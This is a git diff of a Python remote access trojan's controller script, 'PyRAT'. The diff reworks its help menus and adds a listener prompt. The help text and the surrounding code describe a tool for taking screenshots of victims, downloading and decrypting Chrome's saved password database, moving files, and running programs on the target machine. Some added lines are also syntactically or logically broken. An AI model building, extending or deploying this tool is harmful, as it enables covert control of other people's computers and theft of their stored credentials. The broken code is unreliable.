@@ -4,7 +4,7 @@
 #
 
 __author__ = "Black Viking"
-__date__ = "17.03.2017"
+__date__ = "10.04.2017"
 
 END_OF_FILE = "(((END_OF_FILE)))"
 
@@ -27,9 +27,6 @@ red = Fore.RED
 blue = Fore.CYAN
 white = Fore.WHITE
 bright = Style.BRIGHT
-
-host = "127.0.0.1"
-port = 8000
 
 def crypt(TEXT, encode=True):
     if encode == True:
@@ -58,8 +55,42 @@ $$ |      \$$$$$$$ |$$ |  $$ |$$ |  $$ |  $$ |
 \t[>]--->       %sBlack Viking%s       <---[<]
 """%(Style.BRIGHT, red, Style.BRIGHT, Style.NORMAL, Style.BRIGHT, Style.NORMAL)
     print logo
-    help()
     print bright + white + "="*80
+
+def client_help():
+    print bright + yellow + """
+Commands:
+    help()                  : Show this message.
+    screenshot()            : Take a screenshot on client and send image file to server.
+    chrome_db               : Download Chrome's password database and decrypt it.
+    download                : Download files from client.
+    upload                  : Upload files to client from server.
+    message TEXT            : Show messages on target system.
+    info()                  : Show target system's info.
+    execute PROGRAM ARGS    : Execute programs in a new process.
+
+Execute programs on local machine:
+    :dir ==> with ":"
+    :cls
+    :clear"""
+
+def server_help():
+    print bright + yellow """
+Commands:
+    set HOST           : Set HOST value.
+    set PORT           : Set PORT value.
+    settings           : Show HOST and PORT values.
+    start listener     : Start Listener.
+
+Example:
+    >>> PyRAT ==> set HOST 127.0.0.1
+    >>> PyRAT ==> set PORT 8000
+    >>> PyRAT ==> settings
+[~] HOST: 127.0.0.1
+[~] PORT: 8000
+===========================================================
+    >>> start listener
+[-] Listening on ==> 127.0.0.1:8000"""
     
 def send(data):
     global pwd
@@ -144,24 +175,8 @@ def decrypt_db():
     print bright + blue + "[>] Data written to chrome.txt\n"
     a.close()
 
-def help():
-    print green + """
-Commands:
-    help()                  : Show this message.
-    screenshot()            : Take a screenshot on client and send image file to server.
-    chrome_db               : Download Chrome's password database and decrypt it.
-    download                : Download files from client.
-    upload                  : Upload files to client from server.
-    message TEXT            : Show messages on target system.
-    info()                  : Show target system's info.
-    execute PROGRAM ARGS    : Execute programs in a new process.
 
-Execute programs on local machine:
-    :dir ==> with ":"
-    :cls
-    :clear"""
-
-def main():
+def connect(host="127.0.0.1", port=8000):
     global s, cli, addr, hostname, pwd
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((host, port))
@@ -178,7 +193,7 @@ def menu():
     while True:
         command = raw_input("%s[%s@%s]-[%s]~$ "%(bright + green, hostname, addr[0], pwd))
         if command == "help()":
-            help()
+            client_help()
             menu()
 
         elif ":" in command:
@@ -215,6 +230,10 @@ def menu():
         elif command == "": 
             command = " "
 
+        elif command == "exit()":
+            socket.shutdown(socket.SHUT_RDWR)
+            main()
+
         else:
             send(command)
 def start():
@@ -226,7 +245,23 @@ def start():
             print bright + Fore.RED + "Error:\n%s\n"%(e)
             start()
 
+
+#-----------------   Main Function   -----------------#
+
+def main():
+    while True:
+        pyrat = raw_input(bright+red+"PyRAT %s==%s> "%(Style.NORMAL, bright))
+        if "HOST" in pyrat and "PORT" in pyrat:
+            pyrat = pyrat.replace("listen HOST ", "").replace("PORT ", "").split(" ")
+            host, port = pyrat[0], pyrat[1]
+
+        elif pyrat == "show listener":
+            try:
+                print "[~] Host\t: %s\n[~] Port\t: %s\n"%(host, port) + "="*60
+            except:
+                print yellow + bright + "[!] Set 'HOST' and 'PORT' values!"
+
 if __name__ == "__main__":
     init(autoreset=True)
     logo()
-    start()
+    main()
